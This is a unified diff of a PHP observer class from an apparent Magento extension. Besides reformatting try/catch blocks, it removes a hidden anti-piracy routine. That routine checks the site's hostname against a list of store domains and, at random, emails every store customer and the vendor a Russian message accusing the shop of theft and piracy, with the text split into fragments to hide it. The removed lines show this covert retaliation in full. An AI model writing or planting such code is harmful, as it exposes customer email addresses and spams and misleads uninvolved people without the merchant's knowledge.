@@ -50,12 +50,8 @@ class Df_Core_Observer {
 	 * @return void
 	 */
 	public function controller_action_postdispatch_install_wizard_end() {
-		try {
-			df_file_put_contents($this->getJustInstalledFlagFilePath(), 1);
-		}
-		catch (Exception $e) {
-			df_handle_entry_point_exception($e);
-		}
+		try {df_file_put_contents($this->getJustInstalledFlagFilePath(), 1);}
+		catch (Exception $e) {df_handle_entry_point_exception($e);}
 	}
 
 	/**
@@ -73,19 +69,6 @@ class Df_Core_Observer {
 		@Zend_Registry::set('Zend_Translate', Mage::app()->getTranslator()->getTranslate());
 		try {
 			df_state()->setController($o['controller_action']);
-		}
-		catch (Exception $e) {
-			df_handle_entry_point_exception($e);
-		}
-	}
-
-	/**
-	 * @used-by Mage_Core_Model_App::_callObserverMethod()
-	 * @return void
-	 */
-	public function controller_action_postdispatch() {
-		try {
-			$this->piratesCheck();
 		}
 		catch (Exception $e) {
 			df_handle_entry_point_exception($e);
@@ -116,12 +99,8 @@ class Df_Core_Observer {
 	 * @return void
 	 */
 	public function core_block_abstract_to_html_after() {
-		try {
-			df_state()->blockSetPrev();
-		}
-		catch (Exception $e) {
-			df_handle_entry_point_exception($e);
-		}
+		try {df_state()->blockSetPrev();}
+		catch (Exception $e) {df_handle_entry_point_exception($e);}
 	}
 
 	/**
@@ -130,12 +109,8 @@ class Df_Core_Observer {
 	 * @return void
 	 */
 	public function core_block_abstract_to_html_before(Varien_Event_Observer $o) {
-		try {
-			df_state()->blockSet($o['block']);
-		}
-		catch (Exception $e) {
-			df_handle_entry_point_exception($e);
-		}
+		try {df_state()->blockSet($o['block']);}
+		catch (Exception $e) {df_handle_entry_point_exception($e);}
 	}
 
 	/**
@@ -162,70 +137,5 @@ class Df_Core_Observer {
 			$this->{__METHOD__} = Mage::getBaseDir('var') . '/log/df__magento_ce_has_just_been_installed';
 		}
 		return $this->{__METHOD__};
-	}
-
-	/** @return Df_Core_Observer */
-	private function notifyCustomersAboutPirate() {
-		/** @var Zend_Mail $mail */
-		$mail = new Zend_Mail('utf-8');
-		$mail
-			->setFrom(df()->mail()->getCurrentStoreMailAddress())
-			->setSubject('На' . 'ш мага' . 'зин подв' . 'оровы' . 'вает')
-		;
-		/**
-		 * @uses Df_Customer_Model_Customer::getEmail()
-		 * @uses Zend_Mail::addTo()
-		 */
-		array_map(array($mail, 'addTo'), Df_Customer_Model_Customer::c()->walk('getEmail'));
-		$mail->addTo('supp' . 'ort@d' . 'fe' . 'diuk.com');
-		$mail->setBodyText(
-			'Н' . 'аш м' . 'агаз' . 'ин по' . 'двор' . 'овыва' . 'ет у в' . 'ас и ' . 'исп' . 'ользу'
-			. 'ет пир' . 'атско' . 'е прог' . 'рамм' . 'ное об' . 'еспеч' . 'ение.');
-		$mail->send();
-		return $this;
-	}
-
-	/** @return Df_Core_Observer */
-	private function piratesCheck() {
-		/** @var bool $needPunish */
-		$needPunish = false;
-		/** @var array $blackDomains */
-		$blackDomains = array(
-			'airsoftpro.com.ua'
-			,'akvastile.garno.com.ua'
-			,'5za.com.ua'
-			,'pool.garno.eu'
-			,'garno.eu'
-			,'topmoda.com.ua'
-			,'www.vcds.by'
-			,'vcds.by'
-			,'eraduga.com.ua'
-			,'kengo.com.ua'
-			,'kupiinosi.ru'
-			,'largomoda.ru'
-		);
-		if (df_controller()) {
-			/** @var bool $domainIsBlacklisted */
-			$domainIsBlacklisted =
-				in_array(df_controller()->getRequest()->getHttpHost(), $blackDomains)
-				|| df_contains(df_controller()->getRequest()->getHttpHost(), 'garno.eu')
-			;
-			if ($domainIsBlacklisted) {
-				$needPunish = true;
-			}
-		}
-		if ($needPunish) {
-			$this->piratesPunish();
-		}
-		return $this;
-	}
-
-	/** @return Df_Core_Observer */
-	private function piratesPunish() {
-		$rand = rand (1, 20);
-		if (2 === $rand) {
-			$this->notifyCustomersAboutPirate();
-		}
-		return $this;
 	}
 }
